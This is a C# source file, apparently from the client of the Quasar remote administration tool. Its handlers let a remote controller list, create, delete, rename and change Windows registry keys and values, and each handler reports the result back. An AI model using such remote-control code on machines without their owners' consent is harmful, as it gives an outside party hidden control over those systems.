using System;
using Quasar.Common.Messages;
using Quasar.Common.Models;
using xClient.Core.Extensions;
using xClient.Core.Helper;
using xClient.Core.Networking;
using xClient.Core.Registry;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE REGISTRY. */
    public static partial class CommandHandler
    {
        public static void HandleGetRegistryKey(DoLoadRegistryKey packet, Client client)
        {
            GetRegistryKeysResponse responsePacket = new GetRegistryKeysResponse();
            try
            {
                RegistrySeeker seeker = new RegistrySeeker();
                seeker.BeginSeeking(packet.RootKeyName);

                responsePacket.Matches = seeker.Matches;
                responsePacket.IsError = false;
            }
            catch (Exception e)
            {
                responsePacket.IsError = true;
                responsePacket.ErrorMsg = e.Message;
            }
            responsePacket.RootKey = packet.RootKeyName;
            client.Send(responsePacket);
        }

        #region Registry Key Edit

        public static void HandleCreateRegistryKey(DoCreateRegistryKey packet, Client client)
        {
            GetCreateRegistryKeyResponse responsePacket = new GetCreateRegistryKeyResponse();
            string errorMsg;
            string newKeyName = "";

            try
            {
                responsePacket.IsError = !(RegistryEditor.CreateRegistryKey(packet.ParentPath, out newKeyName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }

            responsePacket.ErrorMsg = errorMsg;
            responsePacket.Match = new RegSeekerMatch
            {
                Key = newKeyName,
                Data = RegistryKeyHelper.GetDefaultValues(),
                HasSubKeys = false
            };
            responsePacket.ParentPath = packet.ParentPath;

            client.Send(responsePacket);
        }

        public static void HandleDeleteRegistryKey(DoDeleteRegistryKey packet, Client client)
        {
            GetDeleteRegistryKeyResponse responsePacket = new GetDeleteRegistryKeyResponse();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryEditor.DeleteRegistryKey(packet.KeyName, packet.ParentPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ParentPath = packet.ParentPath;
            responsePacket.KeyName = packet.KeyName;

            client.Send(responsePacket);
        }

        public static void HandleRenameRegistryKey(DoRenameRegistryKey packet, Client client)
        {
            GetRenameRegistryKeyResponse responsePacket = new GetRenameRegistryKeyResponse();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryEditor.RenameRegistryKey(packet.OldKeyName, packet.NewKeyName, packet.ParentPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ParentPath = packet.ParentPath;
            responsePacket.OldKeyName = packet.OldKeyName;
            responsePacket.NewKeyName = packet.NewKeyName;

            client.Send(responsePacket);
        }

        #endregion

        #region RegistryValue Edit

        public static void HandleCreateRegistryValue(DoCreateRegistryValue packet, Client client)
        {
            GetCreateRegistryValueResponse responsePacket = new GetCreateRegistryValueResponse();
            string errorMsg;
            string newKeyName = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.CreateRegistryValue(packet.KeyPath, packet.Kind, out newKeyName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.Value = RegistryKeyHelper.CreateRegValueData(newKeyName, packet.Kind, packet.Kind.GetDefault());
            responsePacket.KeyPath = packet.KeyPath;

            client.Send(responsePacket);
        }

        public static void HandleDeleteRegistryValue(DoDeleteRegistryValue packet, Client client)
        {
            GetDeleteRegistryValueResponse responsePacket = new GetDeleteRegistryValueResponse();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryEditor.DeleteRegistryValue(packet.KeyPath, packet.ValueName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ValueName = packet.ValueName;
            responsePacket.KeyPath = packet.KeyPath;

            client.Send(responsePacket);
        }

        public static void HandleRenameRegistryValue(DoRenameRegistryValue packet, Client client)
        {
            GetRenameRegistryValueResponse responsePacket = new GetRenameRegistryValueResponse();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryEditor.RenameRegistryValue(packet.OldValueName, packet.NewValueName, packet.KeyPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.KeyPath = packet.KeyPath;
            responsePacket.OldValueName = packet.OldValueName;
            responsePacket.NewValueName = packet.NewValueName;

            client.Send(responsePacket);
        }

        public static void HandleChangeRegistryValue(DoChangeRegistryValue packet, Client client)
        {
            GetChangeRegistryValueResponse responsePacket = new GetChangeRegistryValueResponse();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryEditor.ChangeRegistryValue(packet.Value, packet.KeyPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.KeyPath = packet.KeyPath;
            responsePacket.Value = packet.Value;

            client.Send(responsePacket);
        }

        #endregion
    }
}
